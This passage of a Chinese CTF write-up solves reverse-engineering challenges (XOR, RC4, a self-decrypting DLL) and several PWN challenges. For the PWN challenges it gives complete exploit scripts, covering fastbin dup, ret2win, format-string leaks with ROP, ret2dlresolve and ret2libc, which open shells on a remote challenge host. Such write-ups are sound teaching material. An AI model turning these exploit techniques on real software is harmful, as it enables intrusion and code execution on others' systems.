    "3c 36 3b 3d 21 22 6a 28 05 6b 29 05 3f 3b 29 23 27"
)
flag = bytes(value ^ 0x5A for value in encoded)
print(flag.decode("ascii"))
```

运行输出为：

```latex
flag{x0r_1s_easy}
```

将结果直接输入程序进行独立验证：

```powershell
'flag{x0r_1s_easy}' | .\ez_xor.exe
```

程序输出：

```latex
Please enter the flag: Correct! The flag is: flag{x0r_1s_easy}
```

因此本题最终 flag 为：

```latex
flag{x0r_1s_easy}
```

### xor

题目描述

附件为 Windows x64 控制台程序 `challenge (2).exe` 。程序要求输入 flag，并根据内置校验结果显示“正确”或“错误”。

分析过程

使用 `objdump -d -M intel` 查看输入处理函数 `0x140001040` 。程序先读取最多 `0x80` 字节输入、移除换行，然后调用 `0x140001010` 进行校验。该函数的循环从 `0x140001020` 开始：每轮取一个输入字节，与立即数 `0x99` 异或，再与内置字节比较；计数器达到 `0x1a` （26）才返回成功。

核心逻辑可以表示为：

```latex
input[i] XOR 0x99 == cipher[i]    (0 <= i < 26)
```

因此该变换可逆，原始字节为 `cipher[i] XOR 0x99` 。反汇编中比较目标的虚拟地址为 `0x140018350` 。PE 的 `.rdata` 节文件偏移为 `0x16a00` 、RVA 为 `0x18000` ，故对应文件偏移为 `0x16d50` 。从该位置取出 26 字节数据：

```latex
ff f5 f8 fe e2 e1 a9 eb c6 f0 ea c6 f7 a9 ed c6 e9 f5 ad a8 f7 ed fc e1 ed e4
```

复现脚本

以下脚本直接对校验字节逐个异或 `0x99` ，运行 `python solve.py` 即可恢复输入：

```python
cipher = bytes.fromhex(
    "ff f5 f8 fe e2 e1 a9 eb c6 f0 ea c6 f7 a9 ed "
    "c6 e9 f5 ad a8 f7 ed fc e1 ed e4"
)

flag = bytes(value ^ 0x99 for value in cipher)
print(flag.decode())
```

运行输出为：

```latex
flag{x0r_is_n0t_pl41ntext}
```

将该字符串输入原程序，实际输出：

```latex
请输入 flag：正确！这就是 flag。
```

这验证了异或还原结果与程序校验条件一致，本题 flag 为 `flag{x0r_is_n0t_pl41ntext}` 。

### 稍微加密

题目描述

附件为 `challenge (1).exe` ，程序提示输入 flag，并根据内置校验逻辑输出正确或错误提示。

文件信息

-   文件： `C:UserslenovoDownloadschallenge (1).exe`
-   格式：PE x86-64，Windows CUI
-   SHA-256： `BA1396277D8356364978FB032DE5FD035BCFACBDF1A4CCCAD9CBE48B7499EB05`

分析过程

程序入口位于 `0x140001010` 。关键逻辑如下：

1.  读取最多 `0x100` 字节的输入并去掉末尾换行。
2.  输入长度必须为 `0x12` （18）字节。
3.  对第 `i` 个输入字节执行变换：

```latex
index = input[i] XOR key[i mod 4]
output[i] = table[index] XOR ((0x1f * i + 0x13) & 0xff)
```

栈上的常量为 `0xf8854176` ，按小端序取得 key： `76 41 85 f8` 。

1.  变换结果与 `.rdata` 中的 18 字节目标密文比较，相等时输出正确提示。

关键汇编位置：

-   变换逻辑： `0x1400010d0` – `0x14000111e`
-   长度检查： `0x140001123` – `0x140001127`
-   结果比较： `0x140001129` – `0x140001147`
-   查找表虚拟地址： `0x140018350`
-   目标密文虚拟地址： `0x140018450`

`.rdata` 起始文件偏移为 `0x16600` ，所以查找表和目标密文的文件偏移分别为 `0x16950` 、 `0x16a50` 。

逆向脚本

```python
from pathlib import Path

data = Path(r"C:\Users\lenovo\Downloads\challenge (1).exe").read_bytes()
table = data[0x16950:0x16A50]
target = data[0x16A50:0x16A50 + 18]
key = [0x76, 0x41, 0x85, 0xF8]

flag = []
for i, value in enumerate(target):
    wanted = value ^ ((0x1F * i + 0x13) & 0xFF)
    candidates = [
        b for b in range(256)
        if table[b ^ key[i % 4]] == wanted
    ]
    assert len(candidates) == 1, (i, candidates)
    flag.append(candidates[0])

print(bytes(flag).decode())
```

脚本运行输出：

```latex
flag{easy_reverse}
```

最终结果

```latex
flag{easy_reverse}
```

### flag检测器

题目描述

附件为 `flag.exe` ，程序运行后要求输入 flag，并根据内置逻辑判断是否正确。

分析过程

使用 `objdump` 查看 PE x86-64 文件后，入口位于 `0x140001b40` ，实际输入处理从 `0x140001010` 开始。程序读取输入后进入校验分支；成功路径调用 `0x140001370` 。该函数首先遍历 PE 的 `.text` 节，并以 FNV-1a-64 算法计算哈希：初始值为 `0xcbf29ce484222325` ，乘数为 `0x100000001b3` 。对原始附件计算得到：

```latex
FNV-1a-64 = 0xafe9e18bd5fdee08
```

哈希按小端序组成 8 字节 RC4 密钥：

```latex
08 ee fd d5 8b e1 e9 af
```

复现脚本直接将整数哈希转换为 `to_bytes(8, "little")` ，因此得到上述字节序列。

随后，函数从 `.rdata` 的地址 `0x14001a350` 附近取出 26 字节密文，并执行标准 RC4 KSA/PRGA。下面脚本按照 PE 节表自动定位可执行节，计算哈希并解密该密文：

```python
import struct

path = r"flag.exe"
data = open(path, "rb").read()
pe = struct.unpack_from("<I", data, 0x3c)[0]
sections = struct.unpack_from("<H", data, pe + 6)[0]
opt_size = struct.unpack_from("<H", data, pe + 20)[0]
section_table = pe + 24 + opt_size

fnv = 0xcbf29ce484222325
for index in range(sections):
    off = section_table + 40 * index
    raw_size = struct.unpack_from("<I", data, off + 16)[0]
    raw_offset = struct.unpack_from("<I", data, off + 20)[0]
    characteristics = struct.unpack_from("<I", data, off + 36)[0]
    if characteristics & 0x20000000:       # IMAGE_SCN_MEM_EXECUTE
        for byte in data[raw_offset:raw_offset + raw_size]:
            fnv = ((fnv ^ byte) * 0x100000001b3) & 0xffffffffffffffff

key = fnv.to_bytes(8, "little")
cipher = bytes.fromhex(
    "554204b306f61f294de1a6bcbe2dd7fc3b4622269a713e242c28"
)

s = list(range(256))
j = 0
for i in range(256):
    j = (j + s[i] + key[i % len(key)]) & 0xff
    s[i], s[j] = s[j], s[i]

i = j = 0
plain = bytearray()
for byte in cipher:
    i = (i + 1) & 0xff
    j = (j + s[i]) & 0xff
    s[i], s[j] = s[j], s[i]
    plain.append(byte ^ s[(s[i] + s[j]) & 0xff])

print(f"0x{fnv:016x}")
print(bytes(plain).decode())
```

运行输出为：

```latex
0xafe9e18bd5fdee08
flag{p4tch_th3_br4nch_n0w}
```

因此本题最终 flag 为 `flag{p4tch_th3_br4nch_n0w}` 。

### 一个平平无奇的dll

题目描述

附件为 `tgt.dll` 。它导出唯一函数 `CheckFlag` ，调用后读取一行输入并给出正确或错误提示；目标是恢复通过校验的 flag。

分析过程

先查看 PE 结构。样本为 PE32+ x64 DLL， `CheckFlag` 的导出 RVA 是 `0x1000` ，恰好位于独立的 `.check` 节。这个节只有 `0x176` 字节，但直接反汇编得到的都是无意义指令，说明导出函数在装载时才会被解密。

`DllMain` 位于 `.text` 的 `0x180002000` 。在 `DLL_PROCESS_ATTACH` 分支中，它枚举 PE 节表，取 `.text` 节前 `0x100` 字节和 `.check` 节的节表数据，随后调用 `VirtualProtect` 将 `.check` 改为可写。 `0x1800021f8` 的函数以这些数据和 `.rdata` 中 `0x180026380` 的 16 字节常量为密钥材料，对 `.check` 执行四轮 256 字节状态表置换，再用两个状态表的输出异或节内容。解密结束后恢复页面保护。因此不能把磁盘上的 `.check` 直接当作指令流分析。

下面脚本按该逻辑还原 `.check` 。本样本中 `.check` 的文件偏移为 `0x400` ，`.text` 的文件偏移为 `0x600` ，`.rdata` 的文件偏移为 `0x23e00` ；脚本最后从已解密代码中提取 `mov byte ptr [rbp+0x50], imm8` 使用的立即数，再与固定字节 `0xaa` 异或，得到函数构造的待比较字符串。

```python
from pathlib import Path

data = Path("tgt.dll").read_bytes()

# 当前样本的 PE 节文件偏移
check = bytearray(data[0x400:0x400 + 0x176])
text = data[0x600:0x600 + 0x237b0]
material = data[0x23e00 + 0x380:0x23e00 + 0x390]

# DllMain 传给解密例程的 16 字节种子：.text 节偏移 0x100 处的数据。
# 密钥前四字节还与 .check 的 RVA (0x1000) 按小端序异或。
seed = text[0x100:0x110]
key = bytearray(16)
for i in range(16):
    key[i] = seed[i] ^ material[i] ^ ((0x1000 >> (8 * (i % 4))) & 0xff)
key[0] ^= sum(text[:0x100]) & 0xff

# 与 0x1800021f8 对应的四次状态表初始化。
s = list(range(256))
j = 0
for i in range(256):
    j = (j + s[i] + key[i & 15]) & 0xff
    s[i], s[j] = s[j], s[i]

j = 0
for i in range(256):
    j = (j + s[i] + 1 + key[(i + 5) & 15]) & 0xff
    s[i], s[j] = s[j], s[i]

j = 0
for n in range(256):
    i = 255 - n
    j = (j + s[i] + 2 + key[(0x2fd - 3 * n) & 15]) & 0xff
    s[i], s[j] = s[j], s[i]

j = 0
for i in range(256):
    j = (j + s[i] + s[(i + 1) & 255]) & 0xff
    s[i], s[j] = s[j], s[i]

other = [s[(i - 0x63) & 255] for i in range(256)]
j_other = j_s = 0
for n in range(len(check)):
    i = (n + 1) & 255
    a, b = other[i], s[i]
    j_other = (j_other + a) & 0xff
    j_s = (j_s + b) & 0xff
    s[i], s[j_s] = s[j_s], s[i]
    other[i], other[j_other] = other[j_other], other[i]
    check[n] ^= other[(other[i] + a) & 255] ^ s[(s[i] + b) & 255]

# 解密后的入口连续使用 c6 45 50 xx 写入字符异或前的值。
encoded = []
for i in range(len(check) - 3):
    if check[i:i + 3] == b"\xc6\x45\x50":
        encoded.append(check[i + 3])

print(bytes(value ^ 0xaa for value in encoded).decode())
```

运行输出：

```latex
flag{magical_dll}
```

解密后的 `CheckFlag` 先把这 17 字节字符串构造在栈上，随后用 `%255s` 读取输入并调用内部字符串比较函数；相等时选择中文成功提示。为了验证恢复结果，使用 PowerShell P/Invoke 调用 DLL 的导出函数，并向标准输入提供恢复出的字符串：

```powershell
$source = @'
using System;
using System.Runtime.InteropServices;
public static class Verify {
    [DllImport("tgt.dll", CallingConvention=CallingConvention.Winapi)]
    public static extern void CheckFlag();
}
'@
Add-Type -TypeDefinition $source
[Verify]::CheckFlag()
```

输入 `flag{magical_dll}` 后，实际输出为：

```latex
请输入flag: 恭喜你，答对了！
```

因此本题最终 flag 为 `flag{magical_dll}` 。

### 状态机

题目描述

附件为 `challenge.exe` ，程序运行后提示输入 flag，需要分析其状态机校验逻辑并恢复正确 flag。

分析过程

使用 `objdump` 对 PE32+ x64 文件进行静态反汇编。程序的主要校验函数位于 `0x1400012c0` 附近，采用整数状态值驱动的扁平化状态机：

```latex
0x1400012c0  状态机入口
0x14000134d  状态分发与比较
0x140002210  成功分支返回
```

状态机中可以看到大量形如 `0xdead0001` 、 `0xdead0002` 的失败状态，以及多个固定状态常量。继续跟踪状态 `0x1cbe9b2b` 对应的分支，可以发现程序构造了一段 25 字节密文；在后续分支中又构造出 16 字节密钥。密钥字节经过指令中的逐字节异或还原为：

```latex
0c 32 22 61 f4 e0 96 fc ca 5f 6f d4 45 4f e8 d3
```

密文从附件 `.data` 段中提取为：

```latex
14 ea 81 c5 ab 55 d9 f9 cf dd d5 a3 8b f3 c2
6e ac f5 b5 9e d9 b4 ca 83 bb
```

该数据符合 RC4 的典型结构。使用上述密钥执行 RC4 解密即可得到可打印字符串。

解密脚本

```python
key = bytes.fromhex(
    "0c 32 22 61 f4 e0 96 fc ca 5f 6f d4 45 4f e8 d3"
)
cipher = bytes.fromhex(
    "14 ea 81 c5 ab 55 d9 f9 cf dd d5 a3 8b f3 c2 "
    "6e ac f5 b5 9e d9 b4 ca 83 bb"
)

# RC4 KSA
s = list(range(256))
j = 0
for i in range(256):
    j = (j + s[i] + key[i % len(key)]) & 0xff
    s[i], s[j] = s[j], s[i]

# RC4 PRGA
i = j = 0
plain = []
for value in cipher:
    i = (i + 1) & 0xff
    j = (j + s[i]) & 0xff
    s[i], s[j] = s[j], s[i]
    stream = s[(s[i] + s[j]) & 0xff]
    plain.append(value ^ stream)

print(bytes(plain).decode())
```

运行输出：

```latex
flag{R3v3rs3_1s_Fun_2026}
```

## PWN

### 03_fastbin_hook

题目描述

附件是一个 64 位 ELF 程序，题目名为 `03_fastbin_hook` 。程序提供 `add` 、 `edit` 、 `delete` 、 `trigger` 四个菜单功能，目标是利用堆管理漏洞劫持 `.data` 中的函数指针，最终获得 shell。

分析过程

先查看程序保护信息，样本为 amd64，未开启 PIE，无 canary，NX 开启，仅 Partial RELRO：

```latex
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

程序未去符号，关键全局变量和函数地址可以直接从符号表确认：

```latex
win           0x400957
normal_action 0x400970
fake          0x602080
chunks        0x602140
sizes         0x602180
```

`win` 函数内部直接执行 `system("/bin/sh")` ，其中 `/bin/sh` 字符串位于 `.rodata` 。 `trigger` 的逻辑也很直接：它读取 `.data` 中 `fake+0x10` 处的函数指针并调用。初始 `.data` 中的 `fake` 布局如下：

```latex
0x602080: 0x0000000000000000
0x602088: 0x0000000000000071
0x602090: 0x0000000000400970
```

其中 `0x602088` 的 `0x71` 刚好可以作为 fastbin chunk size， `0x602090` 处保存的是初始函数指针 `normal_action` 。因此只要让一次 `malloc(0x60)` 返回到 `0x602090` ，就可以把该函数指针改成 `win` 。

菜单函数中， `add` 限制下标为 `0..7` ，申请大小为 `1..0x68` ，随后把 `malloc` 返回值保存在 `chunks[idx]` ，并把大小保存在 `sizes[idx]` 。 `edit` 会按照 `sizes[idx]` 向 `chunks[idx]` 写入固定长度内容。 `delete` 只调用 `free(chunks[idx])` ，但不会清空 `chunks[idx]` ，也不会清空 `sizes[idx]` 。这同时造成 UAF 和 double free 条件。

利用时选择申请大小 `0x60` ，实际 chunk size 为 `0x70` ，正好匹配 `fake+8` 处伪造的 `0x71` 。先申请两个同大小 chunk，记为 A 和 B，然后按 `free(A) -> free(B) -> free(A)` 的顺序释放，构造经典 fastbin dup 链。由于两次释放 A 之间夹着 B，不会触发旧版 glibc 对“连续 double free”的简单检查。

之后连续申请两次分别取回 A 和 B，此时 fastbin 链表头仍然指向重复出现的 A。利用还保存在 `chunks` 表中的 A 指针，通过 `edit` 把 A 的 `fd` 改成 `fake` ，也就是 `0x602080` 。接下来再申请两次：第一次取回 A，第二次 `malloc(0x60)` 就会把 `0x602080` 当作 fastbin chunk，并返回用户区地址 `0x602080 + 0x10 = 0x602090` 。写入 `p64(win)` 后， `trigger` 调用的函数指针就从 `normal_action` 变成了 `win` 。

本机 Ubuntu 24.04 的 glibc 版本较新，tcache、safe-linking 和额外一致性检查会阻止这个老 fastbin 链完整复现；该利用链对应的是题目预期的旧版 fastbin 行为。远程题目环境若使用旧版 glibc，可以直接按下面脚本打通。

复现脚本

下面脚本用 pwntools 实现完整利用链。默认本地运行 `./pwn2` ，远程运行时传入 `REMOTE HOST=... PORT=...`；如果指定 `CMD` ，脚本会在触发 shell 后自动执行该命令。

```python
from pwn import *

context.arch = "amd64"
context.log_level = args.LOG or "info"

BIN = args.BIN or "./pwn2"
elf = ELF(BIN)


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(BIN, env={"GLIBC_TUNABLES": "glibc.malloc.tcache_count=0"})


io = start()


def add(idx, size, content):
    assert len(content) == size
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Content: ", content)


def edit(idx, content):
    assert len(content) == 0x60
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Content: ", content)


def delete(idx):
    io.sendlineafter(b"Choice: ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())


size = 0x60

add(0, size, b"A" * size)
add(1, size, b"B" * size)
delete(0)
delete(1)
delete(0)

add(2, size, b"C" * size)
add(3, size, b"D" * size)
edit(2, p64(elf.sym.fake) + b"P" * (size - 8))

add(4, size, b"E" * size)
add(5, size, p64(elf.sym.win) + b"F" * (size - 8))

io.sendlineafter(b"Choice: ", b"4")

if args.CMD:
    io.sendline(args.CMD.encode())
    print(io.recvall(timeout=3).decode(errors="replace"))
else:
    io.interactive()
```

远程读取 flag 时可以直接执行：

```bash
python3 exp.py REMOTE HOST=1.95.7.68 PORT=2119 CMD='cat flag'
```

如果需要交互式 shell，则去掉 `CMD` 参数：

```bash
python3 exp.py REMOTE HOST=1.95.7.68 PORT=2119
```

脚本触发 `win` 后会进入 `/bin/sh` 。远程交互验证时，发送 `cat flag` 得到如下回显：

```latex
[*] '/mnt/c/Users/lenovo/Downloads/pwn2 (3)'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to 1.95.7.68 on port 2119: Done
[*] Switching to interactive mode
Triggering...
$ cat flag
flag{0f9352f8-f729-4246-ab02-dcc1dec04cc6}
```

因此本题最终 flag 为：

```latex
flag{0f9352f8-f729-4246-ab02-dcc1dec04cc6}
```

### winwin

题目描述

附件为 64 位 ELF 程序 `winwin` 。程序运行后输出欢迎信息并读取一行输入，目标是通过栈溢出劫持控制流获得 shell，进而读取远程环境中的 flag。

分析过程

先查看程序的保护信息。该样本为 amd64、未开启 PIE、无 canary，NX 开启：

```latex
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

程序没有去符号，反汇编可以直接看到 `win` 函数：

```plain
0000000000400676 <win>:
  400676: 55                    push   rbp
  400677: 48 89 e5              mov    rbp,rsp
  40067a: bf 94 07 40 00        mov    edi,0x400794
  40067f: e8 ac fe ff ff        call   400530 <system@plt>
```

地址 `0x400794` 处的字符串是 `/bin/sh` ，因此只要能返回到 `win()` ，程序就会执行 `system("/bin/sh")` 。

漏洞点在 `main` 函数中。程序在栈上分配 `0x20` 字节缓冲区，随后把缓冲区地址传给 `gets` ：

```plain
0000000000400687 <main>:
  40068b: 48 83 ec 20           sub    rsp,0x20
  ...
  4006df: 48 8d 45 e0           lea    rax,[rbp-0x20]
  4006e3: 48 89 c7              mov    rdi,rax
  4006eb: e8 60 fe ff ff        call   400550 <gets@plt>
  ...
  4006ff: c9                    leave
  400700: c3                    ret
```

缓冲区起始位置为 `rbp-0x20` ，覆盖保存的返回地址需要先填满 `0x20` 字节缓冲区，再覆盖 8 字节保存的 `rbp` ，所以返回地址偏移为 `0x20 + 8 = 40` 。

直接构造 `b"A"*40 + p64(0x400676)` 在本地会崩溃，原因是 x86-64 下进入 `system()` 前栈需要保持 16 字节对齐。利用程序中现成的单条 `ret` 指令先调整一次栈，再返回 `win()` 即可稳定执行 shell。本题可用的对齐地址为 `0x400686` ，最终 ROP 链为：

```latex
padding 40 bytes
0x400686  ret
0x400676  win
```

本地验证时发送 payload 后继续向 shell 写入命令，可以看到命令被执行：

```latex
Welcome to easy pwn!
Give me your payload:
Goodbye!
user
OK
```

复现脚本

下面脚本不依赖 pwntools，远程模式接收 `host port` 参数；指定 `--cmd` 时执行一条命令并退出，不指定时进入交互模式。

```python
#!/usr/bin/env python3
import argparse
import socket
import struct
import subprocess
import sys
import threading


OFFSET = 40
RET = 0x400686
WIN = 0x400676


def p64(x):
    return struct.pack("<Q", x)


def build_payload():
    return b"A" * OFFSET + p64(RET) + p64(WIN)


def recv_to_stdout(sock):
    while True:
        try:
            data = sock.recv(4096)
        except OSError:
            break
        if not data:
            break
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()


def remote(host, port, command=None):
    with socket.create_connection((host, port)) as sock:
        sock.sendall(build_payload() + b"\n")
        if command:
            sock.sendall(command.encode() + b"\n")
            sock.sendall(b"exit\n")
            recv_to_stdout(sock)
            return

        t = threading.Thread(target=recv_to_stdout, args=(sock,), daemon=True)
        t.start()
        try:
            for line in sys.stdin.buffer:
                sock.sendall(line)
        except (BrokenPipeError, OSError, KeyboardInterrupt):
            pass


def local(path, command):
    p = subprocess.Popen(
        [path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    p.stdin.write(build_payload() + b"\n")
    p.stdin.write(command.encode() + b"\nexit\n")
    p.stdin.flush()
    out = p.communicate(timeout=3)[0]
    sys.stdout.buffer.write(out)
    sys.stdout.buffer.flush()


def main():
    parser = argparse.ArgumentParser(description="winwin ret2win exploit")
    parser.add_argument("host", nargs="?", help="remote host")
    parser.add_argument("port", nargs="?", type=int, help="remote port")
    parser.add_argument("--cmd", help="run one shell command instead of interactive mode")
    parser.add_argument("--local", metavar="PATH", help="test against a local ELF path")
    args = parser.parse_args()

    if args.local:
        local(args.local, args.cmd or "id; echo PWNED")
        return

    if not args.host or args.port is None:
        parser.error("remote mode needs host and port")

    remote(args.host, args.port, args.cmd)


if __name__ == "__main__":
    main()
```

远程连接后发送 payload，获得 shell 后读取 `flag` 文件：

```bash
python3 solve_winwin.py 1.95.7.68 2147
```

关键回显为：

```latex
Welcome to easy pwn!
Give me your payload:
Goodbye!

cat flag
flag{0138d64b-af97-4175-8747-126221b28189}
```

因此本题最终 flag 为：

```latex
flag{0138d64b-af97-4175-8747-126221b28189}
```

### Oracle

题目描述

附件为 64 位 ELF 程序 `pwn2 (4)` 。程序先读取一段“oracle”输入，随后进入受限环境执行第二段输入；目标是利用输入漏洞读取 `/flag` 。

分析过程

程序保护如下：

```latex
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: enabled
PIE: enabled
```

`vuln()` 在栈上分配 `0x110` 字节，调用 `read(0, buf, 0xff)` ，随后将输入直接作为格式串传给 `printf(buf)` 。程序会拒绝输入中出现的字节 `0x6e` （字符 `n` ），因此不能使用 `%n` ，但连续发送 `%p` 仍可泄露栈内容。通过 80 个 `%p` 定位到：

-   Canary：格式串输出中位于后段、最低字节为 `0x00` 的值；
-   保存返回地址：Canary 后两个槽位，指向 `main+0x43` ，即 PIE 基址加 `0xb34` 。

之后 `back()` 先把最多 `0x800` 字节读入全局 `stage` （地址为 `PIE+0x202060` ），再读取用户给出的十进制长度。长度经过逐字符计算后限制为不超过 `0x180` ，但随后按该长度向栈缓冲区 `rbp-0x90` 读取，故可覆盖 Canary 之后的返回地址。覆盖布局为：

```latex
0x88 字节填充 | 原 Canary | 8 字节 rbp | ROP 链
```

`gadgets()` 提供 `pop rdi` 、 `pop rsi` 、 `pop rdx` 、 `pop rax` 和 `syscall` ，偏移分别为 `0x17、0x19、0x1b、0x1d、0x1f` 。沙箱允许 `read` 、 `write` 、 `open` 、 `openat` 、 `close` 、 `exit` 等 syscall，因此无需 shell 或 sigreturn：

1.  `open(stage, 0)` 打开 `/flag` ，返回文件描述符 3；
2.  `read(3, stage+0x100, 0x100)` 读取 flag；
3.  `write(1, stage+0x100, 0x100)` 输出 flag。

复现脚本

完整脚本见工作区 solve.py，远程使用：

```bash
python3 solve.py HOST=1.95.7.68 PORT=2057 FILE=/flag
```

脚本先解析 `%p` 泄露得到 Canary 和 PIE 基址，再发送 0x800 字节的 stage 数据，最后发送 384 字节 ROP 栈 payload。

远程验证输出：

```latex
[+] Opening connection to 1.95.7.68 on port 2057: Done
[*] canary = 0x98d5460dcf5f2600, PIE base = 0x56224d245000
flag{d07fa082-4779-4407-800c-7a07a6398a0e}
```

因此本题最终 flag 为：

```latex
flag{d07fa082-4779-4407-800c-7a07a6398a0e}
```

### ret2dl

题目描述

附件为 32 位 ELF 程序 `pwn2` 。程序存在栈溢出，目标是在没有已知 libc 地址的情况下通过动态链接器解析 `system` ，取得 shell 后读取远程环境中的 `/flag` 。

分析过程

对附件执行 `file` / `checksec` ，得到：

```latex
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
Debuginfo:  Yes
```

因此程序代码地址固定，栈不可执行但可以使用 ROP；同时没有 RELRO，动态链接相关表可被利用。漏洞函数的栈缓冲区到返回地址的距离为 `0x88` 字节。程序中存在 `leave; ret` 、 `pop` 系列 gadget，以及 `read@plt` 和 PLT0，符号表中还保留了 `fake_buf` 。这些条件适合使用 `ret2dlresolve` ：先把后续 ROP 和伪造的 ELF 动态解析结构写入 `fake_buf` ，再让 PLT0 按伪造的重定位项解析出并调用 `system("/bin/sh")` 。

第一阶段 payload 以 `0x88` 字节填充覆盖返回地址，完成两次 `read` ：第一次向 `.dynamic` 中的 `DT_VERSYM` 指针位置写入 4 字节修正值，第二次把第二阶段数据写入 `fake_buf` 。随后通过 `leave; ret` 将栈迁移到 `fake_buf` 。第二阶段的返回链为 `PLT0 -> reloc_index -> main -> system("/bin/sh")` ，其后紧跟伪造的 `Elf32_Rel` 、 `Elf32_Sym` 和字符串表内容。

`Ret2dlresolvePayload` 自动生成 `system` 符号及 `/bin/sh` 参数，但本样本的伪造数据与版本表布局相差一个可写槽位，需要额外计算并写入 `versym_fix` 。脚本从生成的 payload 中取出符号索引，按

```latex
versym_fix = fake_buf + 0x80 - sym_index * 2
```

计算修正值，再通过第一阶段的 `read(0, DT_VERSYM_PTR, 4)` 写入。这样动态链接器查询版本信息时能够落到伪造区域，解析流程即可继续执行。

复现脚本

将附件 `pwn2` 与下面的 `solve_ret2dl.py` 放在同一目录。脚本默认使用 `ret2dl_work` 中的 32 位 glibc 2.23 运行本地样本；远程模式只需传入题目地址和端口。指定 `CMD` 可在获得 shell 后自动执行命令。

```python
#!/usr/bin/env python3
from pathlib import Path
from pwn import *

ROOT = Path(__file__).resolve().parent
BIN = ROOT / "pwn2"
LD = ROOT / "ret2dl_work/libc6_2.23_i386/lib/i386-linux-gnu/ld-linux.so.2"
LIBDIR = ROOT / "ret2dl_work/libc6_2.23_i386/lib/i386-linux-gnu"

context.binary = elf = ELF(str(BIN))
context.arch = "i386"
context.log_level = args.LOG or "info"

BUF_SIZE = 0x88
FAKE_STACK = elf.sym["fake_buf"]
LEAVE_RET = 0x0804850f
POP3_RET = 0x080485c9
POP4_RET = 0x080485c8
DT_VERSYM_PTR = 0x080497f8
PLT0 = 0x08048360


def start():
    if args.REMOTE:
        return remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
    return process([str(LD), "--library-path", str(LIBDIR), str(BIN)], cwd=str(ROOT))


def build_payloads():
    dlresolve = Ret2dlresolvePayload(
        elf, symbol="system", args=["/bin/sh"], data_addr=FAKE_STACK + 0x100
    )
    sym_index = u32(dlresolve.payload[0x20:0x24]) >> 8
    versym_fix = (FAKE_STACK + 0x80) - sym_index * 2

    stage2 = flat(
        b"BBBB", PLT0, dlresolve.reloc_index, elf.sym["main"],
        dlresolve.real_args[0]
    )
    stage2 = stage2.ljust(0x80, b"\x00") + p16(2) + stage2[0x82:]
    stage2 = stage2.ljust(0x100, b"\x00") + dlresolve.payload

    stage1 = flat(
        b"A" * BUF_SIZE, 0, elf.plt["read"], POP3_RET,
        0, DT_VERSYM_PTR, 4, elf.plt["read"], POP4_RET,
        0, FAKE_STACK, len(stage2), FAKE_STACK, LEAVE_RET
    ).ljust(0x100, b"\x00")
    return stage1, p32(versym_fix), stage2


io = start()
stage1, versym_fix, stage2 = build_payloads()
log.info("stage1=%d bytes, versym_fix=%d bytes, stage2=%d bytes",
         len(stage1), len(versym_fix), len(stage2))
io.send(stage1)
io.send(versym_fix)
io.send(stage2)

if args.CMD:
    io.sendline(args.CMD.encode())
    print(io.recvrepeat(1).decode(errors="replace"))
else:
    io.interactive()
```

远程运行命令为：

```bash
python3 solve_ret2dl.py REMOTE HOST=1.95.7.68 PORT=2119
```

脚本输出显示三个关键长度：

```latex
[*] stage1=256 bytes, versym_fix=4 bytes, stage2=300 bytes
```

随后进入交互 shell，执行 `cat flag` 得到：

```latex
flag{8a71044d-093f-4638-939e-1b85a6e557fb}
```

该回显验证了栈迁移、版本表修补、伪造动态解析结构和 `system` 调用均已成功，因此本题最终 flag 为 `flag{8a71044d-093f-4638-939e-1b85a6e557fb}` 。

### 02_leak_rop

题目描述

附件包含 64 位 ELF 程序 `pwn2` 及其对应的 `libc.so (1).6` 。程序从标准输入读取用户数据，目标是利用栈溢出获得 shell 并读取 flag。

分析过程

对程序执行 `file` 和 `checksec` 可知：程序为 amd64、无 canary、无 PIE、NX 开启且仅 Partial RELRO。 `vuln` 在栈上分配 0x40 字节，却调用 `read` 读取 0x200 字节，因此可以覆盖返回地址。保存的 `rbp` 占 8 字节，所以返回地址相对缓冲区的偏移为 `0x40 + 8 = 72` 。

程序只导入了 `read` 、 `write` 等函数，并提供以下可用 gadget： `pop rdi; ret` 位于 `0x4006db` ， `pop rsi; ret` 位于 `0x4006dd` ， `pop rdx; ret` 位于 `0x4006df` 。第一阶段 ROP 设置 `write(1, write@got, 8)` ，泄露 libc 中 `write` 的真实地址，然后返回 `vuln` 再次接收输入。泄露值减去给定 libc 的 `write` 偏移即可得到 libc 基址。

第二阶段使用一个单独的 `ret` （ `0x400511` ）调整栈对齐，再调用 `system` ，参数设置为给定 libc 中的 `/bin/sh` 字符串地址。远程验证命令如下：

```bash
python3 exploit.py REMOTE=1 HOST=1.95.7.68 PORT=2077 \\
  LIBC="/mnt/c/Users/lenovo/Downloads/libc.so (1).6" CMD="cat /flag"
```

关键输出为：

```latex
[*] write leak: 0x7ffb545993b0, libc base: 0x7ffb544a2000
flag{7a04b178-d737-4518-bf60-a4b0c5a7184c}
```

这确认了泄露、地址计算和第二阶段 ret2libc 链均有效。本题最终 flag 为 `flag{7a04b178-d737-4518-bf60-a4b0c5a7184c}` 。

复现脚本

下面是完整的 pwntools 脚本。它接收 `REMOTE` 、 `HOST` 、 `PORT` 和 `LIBC` 参数；不指定 `CMD` 时进入交互式 shell，指定 `CMD` 时自动发送命令并打印结果。

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = args.BIN or "/mnt/c/Users/lenovo/Downloads/pwn2"
LIBC = args.LIBC or "/mnt/c/Users/lenovo/Downloads/libc.so (1).6"
elf = ELF(BIN, checksec=False)
